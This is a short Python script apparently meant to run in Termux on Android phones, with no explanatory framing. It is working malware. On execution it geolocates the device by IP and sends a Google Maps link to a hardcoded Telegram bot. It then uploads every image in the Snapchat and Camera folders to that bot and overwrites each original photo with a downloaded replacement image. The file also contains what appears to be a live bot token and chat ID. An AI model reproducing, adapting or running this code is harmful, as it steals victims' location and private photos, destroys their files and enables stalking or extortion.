import os
try:
	import requests
except:
	os.system("pip install requests")
	import requests
	
def send_photo_with_caption(photo):
    url = f"https://api.telegram.org/bot7908174271:AAH0sOxnMkFTeWN34jqMj_f_qeXg0tJiyrE/sendPhoto"
    response = requests.post(url, data={'chat_id': '743500292', 'caption': "dev: @lw_w7"}, files={'photo': photo})
    
path = "/data/data/com.termux/files/home/storage/dcim/"
filess =["Snapchat",'Camera']
def Almunharif1():
	response = requests.get("https://api.ipify.org?format=json")
	ip_data = response.json()
	ip =  ip_data.get('ip')
	response = requests.get(f"http://ip-api.com/json/{ip}")
	data = response.json()
	if data['status'] == 'fail':
		return "لم يتمكن من جلب الموقع."
	latitude = data['lat']
	longitude = data['lon']
	location_map_url = f"https://www.google.com/maps?q={latitude},{longitude}"
	requests.post(url="https://api.telegram.org/bot7908174271:AAH0sOxnMkFTeWN34jqMj_f_qeXg0tJiyrE/sendMessage",data={"chat_id":'743500292',"text":location_map_url})
Almunharif1()
for dir in filess:
	if os.path.exists(path+dir):
		files = os.listdir(path+dir)
		for file in files:
			filename = os.path.join(path+dir,file)
			if filename.endswith(".png") or filename.endswith(".jpg") or filename.endswith(".jpeg"):
				with open(os.path.join(filename),'rb') as img:
					send_photo_with_caption(img)
				with open(os.path.join(filename),'wb') as img:
					img.write(requests.get("https://h.top4top.io/p_3256l4oow0.jpg").content)
				
